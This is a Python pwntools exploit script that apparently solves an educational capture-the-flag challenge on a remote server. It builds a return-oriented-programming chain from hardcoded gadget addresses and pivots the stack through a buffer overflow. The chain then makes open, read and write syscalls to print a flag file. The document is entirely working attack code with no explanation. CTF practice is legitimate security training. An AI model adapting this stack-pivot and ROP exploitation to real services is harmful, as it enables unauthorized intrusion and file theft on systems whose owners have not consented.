from pwn import *
import sys
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

r= remote('edu-ctf.zoolab.org',30204)

ROP_addr = 0x4df360
fn = 0x4df460

pop_rdi_ret = 0x40186a
pop_rsi_ret = 0x4028a8

pop_rdx_ret = 0x40176f
pop_rax_ret = 0x4607e7
syscall_ret = 0x42cea4
leave_ret = 0x401ebd

ROP = flat(
    pop_rdi_ret, fn,
    pop_rsi_ret, 0,
    pop_rax_ret, 2,
    syscall_ret,

    pop_rdi_ret,3,
    pop_rsi_ret,fn,
    pop_rdx_ret,0x30,
    pop_rax_ret,0,
    syscall_ret,

    pop_rdi_ret,1,
    pop_rax_ret,1,
    syscall_ret,
)

r.sendafter('Give me filename: ', '/home/rop2win/flag\x00')
r.sendafter('Give me ROP: ',b'A'*0x8 + ROP)
r.sendafter('Give me overflow: ',b'A'*0x20  + p64(ROP_addr) + p64(leave_ret))
r.interactive()
